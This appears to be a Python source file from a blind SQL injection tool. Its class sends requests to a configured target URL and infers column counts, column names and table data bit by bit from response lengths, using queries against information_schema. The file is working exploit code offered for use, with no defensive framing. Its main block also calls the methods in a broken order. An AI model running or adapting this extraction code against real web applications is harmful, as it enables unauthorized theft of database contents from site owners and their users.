import requests
from requests.utils import requote_uri
import bitwise_public


# First,if you want to get data,you know table name(or db name?)

class GetTableDataClass:
    def __init__(self, method=bitwise_public.HTTPMethod.GET):
        self.SUCCESS_LENGTH = self.SUCCESS_LENGTH = len(
            requests.post(url=bitwise_public.TARGET_URL, data=bitwise_public.SUCCESS_DATA_PARAMS)
            .text) \
            if method == bitwise_public.HTTPMethod.POST else len(requests.get(bitwise_public.TARGET_URL)
                                                                 .text)

        # Number of column
        self.column_number = 0
        # Column name length
        self.column_name_length = []
        # Column names
        self.column_name = []

    def get_column_number(self, method=bitwise_public.HTTPMethod.GET):
        number_bin_list = []
        query = """select count(*) from information_schema.columns
                where table_name = '{0}'""".format(bitwise_public.TABLE_NAME)
        for shift_idx in range(7, -1, -1):
            # Need know DB name
            res_length = bitwise_public.get_count_by_post_method(query, shift_idx) if method == bitwise_public \
                .HTTPMethod.POST else bitwise_public.get_count_by_get_method(query, shift_idx)

            number_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

        self.column_number = bitwise_public.parsing_bin_list_to_decimal(number_bin_list)
        print(self.column_number)

    def get_column_length(self, method=bitwise_public.HTTPMethod.GET):
        for column_idx in range(self.column_number):
            column_length_bin_list = []
            query = """select column_name from information_schema.columns where 
                    table_name = '{0}' limit {1},1""".format(bitwise_public.TABLE_NAME, column_idx)
            for shift_idx in range(7, -1, -1):
                res_length = bitwise_public.get_length_by_post_method(query, shift_idx) if method == bitwise_public. \
                    HTTPMethod.POST else bitwise_public.get_length_by_get_method(query, shift_idx)
                column_length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

            self.column_name_length.append(bitwise_public.parsing_bin_list_to_decimal(column_length_bin_list))

        print(self.column_name_length)

    def get_column_name(self, method=bitwise_public.HTTPMethod.GET):
        query = """select COLUMN_NAME from information_schema.columns 
                   where table_name = '{0}'""".format(bitwise_public.TABLE_NAME)
        for column_idx in range(self.column_number):
            column_char_list = []
            for column_name_idx in range(self.column_name_length[column_idx]):
                column_name_char_bin_list = []
                for shift_idx in range(7, -1, -1):
                    res_length = bitwise_public.get_data_by_post_method(query, column_name_idx, shift_idx, 0) \
                        if method == bitwise_public.HTTPMethod.POST \
                        else bitwise_public.get_data_by_get_method(query,
                                                                   column_name_idx + 1,
                                                                   shift_idx,
                                                                   0)
                    column_name_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

                column_char_list.append(bitwise_public.parsing_bin_list_to_char(column_name_char_bin_list))

            self.column_name.append(''.join(column_char_list))

    # Just get only first and one column data, so, you must get column information.
    def get_data_length(self, column_name, method=bitwise_public.HTTPMethod.GET):
        length_bin_list = []
        query = """select {0} from {1} limit 0,1""".format(column_name, bitwise_public.TABLE_NAME)
        for shift_idx in range(7, -1, -1):
            res_length = bitwise_public.get_length_by_post_method(query, shift_idx) if method == bitwise_public. \
                HTTPMethod.POST else bitwise_public.get_length_by_get_method(query, shift_idx)

            length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

        return bitwise_public.parsing_bin_list_to_decimal(length_bin_list)

    def get_one_data(self, column_name, method=bitwise_public.HTTPMethod.GET):
        data_length = self.get_data_length(column_name)
        data_char_list = []

        query = """select {0} from {1} limit 0,1""".format(column_name,
                                                           bitwise_public.TABLE_NAME)
        for data_idx in range(data_length):
            data_char_bin_list = []
            for shift_idx in range(7, -1, -1):
                res_length = bitwise_public.get_data_by_post_method(query, data_idx, shift_idx, 0) \
                    if method == bitwise_public.HTTPMethod.POST else bitwise_public.get_data_by_get_method(
                    query,
                    data_idx + 1,
                    shift_idx,
                    0)
                data_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

            data_char_list.append(bitwise_public.parsing_bin_list_to_char(data_char_bin_list))

        return ''.join(data_char_list)


if __name__ == '__main__':
    test_class = GetTableDataClass()

    test_class.get_column_length()
    test_class.get_column_length()
    test_class.get_column_number()
